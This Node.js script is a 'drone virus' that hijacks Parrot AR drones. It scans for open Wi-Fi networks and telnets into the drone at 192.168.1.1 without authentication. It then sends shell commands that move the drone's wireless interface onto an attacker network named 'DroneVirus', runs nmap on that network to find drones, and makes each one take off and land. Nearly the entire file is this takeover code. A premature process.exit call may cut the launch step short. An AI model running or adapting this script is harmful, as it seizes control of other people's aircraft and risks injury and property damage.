var Wireless = require('./wireless')
  , async = require('async')
  , drone = require('ar-drone')
  , net = require('net')
  , parseString = require('xml2js').parseString
  , exec = require('child_process').exec
  , fs = require('fs')
  , ip = 69;

function takeControl(cb) {
  console.log("Setting up to test if isDrone");
  setTimeout(function() {
    var client = net.connect(23, "192.168.1.1");

    client.on("connect", function() {
      console.log("IS A DRONE");
      ip++;
      client.write('ifconfig ath0 down ; iwconfig ath0 mode managed essid DroneVirus ap any channel auto commit ; ifconfig ath0 192.168.43.'+ip+' netmask 255.255.255.0 up\r\n');
      client.destroy();
      cb(true);
    });

    client.on("error", function(err) {
      console.log("NOT A DRONE");
      client.destroy();
      cb(false);
    });


  }, 5000);
};

var network = new Wireless({ });

network.scan(function(err, networks) {
  var insecureNetworks = networks.filter(function(network) {
    return network.security == "NONE";
  }).map(function(network) {
    return network.ssid;
  });

  async.eachSeries(insecureNetworks, function(ssid, callback) {
    console.log("Connecting to " + ssid);

    if(!(ssid == "Tingle" || ssid == "Link" || ssid == "DroneVirus")) {
      console.log("Skipping " + ssid);
      return callback();
    }

    network.connect(ssid, function(err) {
      console.log("Connected to " + ssid);
      if(err) {
        return callback(err);
      }

      takeControl(function(yes) {
        if(yes) {
          console.log(ssid + " is a drone");
          callback();
        } else {
          console.log(ssid + " isn't a drone");
          callback()
        }
      });
    });
  }, function(err) {
    console.log("Connecting to DroneVirus");
    network.connect("DroneVirus", function() {
      console.log("Setting up manual IP setup");
      var child = exec('sudo networksetup -setmanual Wi-Fi 192.168.43.2 255.255.255.0 192.168.43.1',
        function (error, stdout, stderr) {
          if (error) {
            console.log("Error: " + error);
          }
          console.log("scanning for drones on dronevirus, then launching and landing");
            var drones = [];

            var child = exec('sudo nmap -n -p 23 -T4 -oX out.xml 192.168.43.1/24',
              function (error, stdout, stderr) {
                
                fs.readFile('out.xml', 'utf8', function (err,data) {
                  if (err) {
                    return console.log(err);
                  }
                  parseString(data, function (err, result) {
                    result.nmaprun.host.forEach(function(host) {
                      if (host.address[1] && host.address[1].$.vendor == 'Parrot') {
                        var ip = host.address[0].$.addr;
                        var client = drone.createClient({ip: ip});
                        console.log(ip)
                        drones.push(client);
                      }
                    });
                    drones.forEach(function(client) {
                      console.log("LAuNCHING");
                      //console.log(client);
                      client.takeoff();
                      client.after(10000,function() {client.land();});
                    });
                  });
                });
              });

        });

    });
    
    console.log("DONE!!!");
    process.exit(1);
  });

});

